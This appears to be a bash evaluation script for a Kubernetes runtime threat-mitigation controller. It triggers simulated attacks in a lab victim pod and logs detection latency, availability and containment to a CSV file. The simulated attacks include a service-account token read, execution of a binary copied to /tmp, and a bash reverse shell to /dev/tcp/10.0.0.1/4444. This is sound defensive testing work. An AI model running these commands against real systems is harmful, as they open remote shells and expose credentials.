#!/usr/bin/env bash
set -euo pipefail

REPO_DIR="/home/charumadhi_m/rtm-k8s-runtime-threat-mitigation"
cd "$REPO_DIR"
export PATH="$HOME/.local/bin:$PATH"

REPEATS="${REPEATS:-3}"
CSV_FILE="$REPO_DIR/docs/evaluation-results.csv"

echo "=== Starting Evaluation (REPEATS=$REPEATS) ==="
mkdir -p "$REPO_DIR/docs"

# If arguments given, use them as strategies; else default to all three
if [ $# -gt 0 ]; then
  STRATEGIES=("$@")
else
  STRATEGIES=("detect_only" "always_delete" "graduated")
fi

HEADER="strategy,scenario,run,pod,first_action,enforcement_action,attack_to_received_s,received_to_action_s,attack_to_action_s,downtime_s,availability_pct,contained"

# Ensure avail-probe pod exists and is ready
if ! kubectl get pod avail-probe -n rtm-tools >/dev/null 2>&1; then
  echo "Creating avail-probe pod in rtm-tools..."
  cat << 'EOF' | kubectl apply -f -
apiVersion: v1
kind: Pod
metadata:
  name: avail-probe
  namespace: rtm-tools
  labels:
    app: avail-probe
spec:
  containers:
    - name: probe
      image: curlimages/curl:8.7.1
      imagePullPolicy: IfNotPresent
      command:
        - sh
        - -c
        - |
          while true; do
            rc=0
            curl -m 1 -s -o /dev/null http://victim.shop.svc.cluster.local:8002/health || rc=$?
            echo "$(date +%s.%N) $rc"
            sleep 0.5
          done
EOF
  kubectl wait --namespace=rtm-tools --for=condition=Ready pod/avail-probe --timeout=30s
fi

echo "=========================================================="
echo "=== Step 4 PREFLIGHT: Checking Falco clock synchronization ==="
echo "=========================================================="
check_falco_clock() {
  local test_tag="preflight_$(date +%s)"
  kubectl exec deploy/victim -n shop -- sh -c "echo $test_tag" >/dev/null 2>&1 || true
  sleep 3

  local latest_alert
  latest_alert=$(kubectl logs deploy/rtm-controller -n rtm-system --tail=20 | grep "$test_tag" | tail -n 1 || true)
  if [ -z "$latest_alert" ]; then
    echo "Preflight warning: test event not yet in controller logs, waiting 3s..."
    sleep 3
    latest_alert=$(kubectl logs deploy/rtm-controller -n rtm-system --tail=20 | grep "$test_tag" | tail -n 1 || true)
  fi

  python3 - << EOF
import json, sys
from datetime import datetime

line = """$latest_alert""".strip()
if not line:
    print("NO_ALERT")
    sys.exit(0)

try:
    d = json.loads(line)
    alert_ts_str = d.get("ts", "")
    received_ts = d.get("received_ts")
    if not alert_ts_str or not received_ts:
        print("MISSING_FIELDS")
        sys.exit(0)
    dt = datetime.fromisoformat(alert_ts_str.rstrip("Z"))
    alert_epoch = dt.timestamp()
    offset = alert_epoch - received_ts
    print(f"{offset:.4f}")
except Exception as e:
    print(f"ERROR: {e}")
EOF
}

preflight_offset=$(check_falco_clock)
echo "Preflight check 1: Falco alert_ts - received_ts = ${preflight_offset} s"

is_over_2s=$(python3 -c "
try:
    val = abs(float('$preflight_offset'))
    print('true' if val > 2.0 else 'false')
except:
    print('true')
")

if [ "$is_over_2s" = "true" ]; then
  echo "Preflight: clock offset ${preflight_offset}s exceeds 2s threshold! Restarting Falco daemonset..."
  kubectl rollout restart daemonset/falco -n falco
  kubectl rollout status daemonset/falco -n falco --timeout=60s
  sleep 5
  preflight_offset=$(check_falco_clock)
  echo "Preflight check 2 (after restart): Falco alert_ts - received_ts = ${preflight_offset} s"

  is_still_over=$(python3 -c "
try:
    val = abs(float('$preflight_offset'))
    print('true' if val > 2.0 else 'false')
except:
    print('true')
")
  if [ "$is_still_over" = "true" ]; then
    echo "ERROR: Falco clock offset ${preflight_offset}s is STILL over 2s after restart. Stopping!"
    exit 1
  fi
fi

echo "# preflight_falco_clock_offset_s: ${preflight_offset}" > "$CSV_FILE"
echo "$HEADER" >> "$CSV_FILE"

SCENARIOS=("E1" "E2" "E3" "E4")

for strat in "${STRATEGIES[@]}"; do
  echo "=========================================================="
  echo "Setting Strategy: $strat (DRY_RUN=false)"
  echo "=========================================================="
  kubectl set env deploy/rtm-controller -n rtm-system STRATEGY="$strat" DRY_RUN=false
  kubectl rollout status deploy/rtm-controller -n rtm-system --timeout=60s
  sleep 10

  for scen in "${SCENARIOS[@]}"; do
    case "$scen" in
      E1)
        attack_type="shell"
        attack_cmd="sh -c 'echo hi'"
        ;;
      E2)
        attack_type="token read"
        attack_cmd="sh -c 'cat /var/run/secrets/kubernetes.io/serviceaccount/token > /dev/null'"
        ;;
      E3)
        attack_type="tmp binary"
        attack_cmd="sh -c 'cp /bin/ls /tmp/vx && /tmp/vx /'"
        ;;
      E4)
        attack_type="reverse shell"
        attack_cmd="bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'"
        ;;
    esac

    for ((r=1; r<=REPEATS; r++)); do
      echo "--- [$strat] Scenario: $scen ($attack_type), Run: $r/$REPEATS ---"

      # 1. Delete victim pod, wait ready, sleep 10
      kubectl delete pod -n shop -l app=victim --now >/dev/null 2>&1 || true
      kubectl wait --namespace=shop --for=condition=Ready pod -l app=victim --timeout=60s >/dev/null
      sleep 10

      # 2. Record victim pod name
      victim_pod=$(kubectl get pod -n shop -l app=victim -o jsonpath='{.items[0].metadata.name}')
      echo "Victim pod: $victim_pod"

      # 3. Record t_attack and exec attack
      t_attack=$(date +%s.%N)
      echo "t_attack: $t_attack"
      if [ "$scen" = "E4" ]; then
        timeout 5s kubectl exec deploy/victim -n shop -- bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1' >/dev/null 2>&1 || true
      elif [ "$scen" = "E3" ]; then
        kubectl exec deploy/victim -n shop -- sh -c 'cp /bin/ls /tmp/vx && /tmp/vx /' >/dev/null 2>&1 || true
      elif [ "$scen" = "E2" ]; then
        kubectl exec deploy/victim -n shop -- sh -c 'cat /var/run/secrets/kubernetes.io/serviceaccount/token > /dev/null' >/dev/null 2>&1 || true
      else
        kubectl exec deploy/victim -n shop -- sh -c 'echo hi' >/dev/null 2>&1 || true
      fi

      # 4. Wait 30 s
      sleep 30
      t_end=$(date +%s.%N)

      # 5. Fetch logs
      controller_logs=$(kubectl logs deploy/rtm-controller -n rtm-system --tail=100)
      probe_logs=$(kubectl logs avail-probe -n rtm-tools --tail=200)

      # 6. Check contained status
      is_alive=$(kubectl get pod "$victim_pod" -n shop --no-headers 2>/dev/null | awk '{print $3}' || true)
      if [ -z "$is_alive" ] || [ "$is_alive" = "Terminating" ]; then
        contained="deleted"
      else
        tier_label=$(kubectl get pod "$victim_pod" -n shop -o jsonpath='{.metadata.labels.rtm\.tier}' 2>/dev/null || true)
        if [ "$tier_label" = "restrict" ]; then
          rc=0
          kubectl exec -n shop "$victim_pod" -- curl -m 2 -s -o /dev/null https://1.1.1.1 >/dev/null 2>&1 || rc=$?
          if [ "$rc" -ne 0 ]; then
            contained="egress_blocked"
          else
            contained="open"
          fi
        else
          contained="open"
        fi
      fi

      # 7. Compute row via Python
      python3 - << EOF >> "$CSV_FILE"
import json, sys

t_attack = float("$t_attack")
t_end = float("$t_end")
victim_pod = "$victim_pod"
strategy = "$strat"
scenario = "$scen"
run_num = "$r"
contained = "$contained"

controller_logs = """$controller_logs"""
first_action = "none"
enforcement_action = ""
attack_to_received_s = ""
received_to_action_s = ""
attack_to_action_s = ""

first_d = None
enforce_d = None

for line in controller_logs.strip().split("\n"):
    if '{"strategy":' in line and victim_pod in line:
        try:
            d = json.loads(line)
            rec_ts = d.get("received_ts", 0)
            if rec_ts >= t_attack - 2.0:
                if first_d is None:
                    first_d = d
                if d.get("action") != "alert_only" and enforce_d is None:
                    enforce_d = d
        except Exception:
            pass

if first_d:
    first_action = first_d.get("action", "none")

# If an enforcement action occurred, compute timings from enforcement decision
target_d = enforce_d if enforce_d else first_d

if target_d:
    rec_ts = target_d.get("received_ts")
    act_done = target_d.get("action_done_ts")

    if rec_ts is not None:
        diff_att_rec = rec_ts - t_attack
        if diff_att_rec < 0:
            print(f"ERROR: negative attack_to_received_s: {diff_att_rec}", file=sys.stderr)
        attack_to_received_s = f"{diff_att_rec:.3f}"

    if enforce_d:
        enforcement_action = enforce_d.get("action", "")
        if rec_ts is not None and act_done is not None:
            diff_rec_act = act_done - rec_ts
            if diff_rec_act < 0:
                print(f"ERROR: negative received_to_action_s: {diff_rec_act}", file=sys.stderr)
            received_to_action_s = f"{diff_rec_act:.3f}"

            diff_att_act = act_done - t_attack
            if diff_att_act < 0:
                print(f"ERROR: negative attack_to_action_s: {diff_att_act}", file=sys.stderr)
            attack_to_action_s = f"{diff_att_act:.3f}"

probe_logs = """$probe_logs"""
failures = 0
total_probes = 0

for line in probe_logs.strip().split("\n"):
    parts = line.strip().split()
    if len(parts) >= 2:
        try:
            ts_str = parts[0].rstrip(".")
            pts = float(ts_str)
            rc = int(parts[1])
            if (t_attack - 1.0) <= pts <= (t_end + 1.0):
                total_probes += 1
                if rc != 0:
                    failures += 1
        except Exception:
            pass

downtime_s = f"{failures * 0.5:.1f}"
if total_probes > 0:
    avail_pct = f"{((total_probes - failures) / total_probes * 100):.1f}"
else:
    avail_pct = "100.0"

csv_row = f"{strategy},{scenario},{run_num},{victim_pod},{first_action},{enforcement_action},{attack_to_received_s},{received_to_action_s},{attack_to_action_s},{downtime_s},{avail_pct},{contained}"
print(csv_row)
EOF

      tail -n 1 "$CSV_FILE"
    done
  done
done

echo "=========================================================="
echo "Resetting controller to STRATEGY=graduated DRY_RUN=true..."
echo "=========================================================="
kubectl set env deploy/rtm-controller -n rtm-system STRATEGY=graduated DRY_RUN=true
kubectl rollout status deploy/rtm-controller -n rtm-system --timeout=60s

echo "Final controller environment:"
kubectl get deploy rtm-controller -n rtm-system -o jsonpath='{.spec.template.spec.containers[0].env}'
echo ""

echo "Evaluation completed successfully."
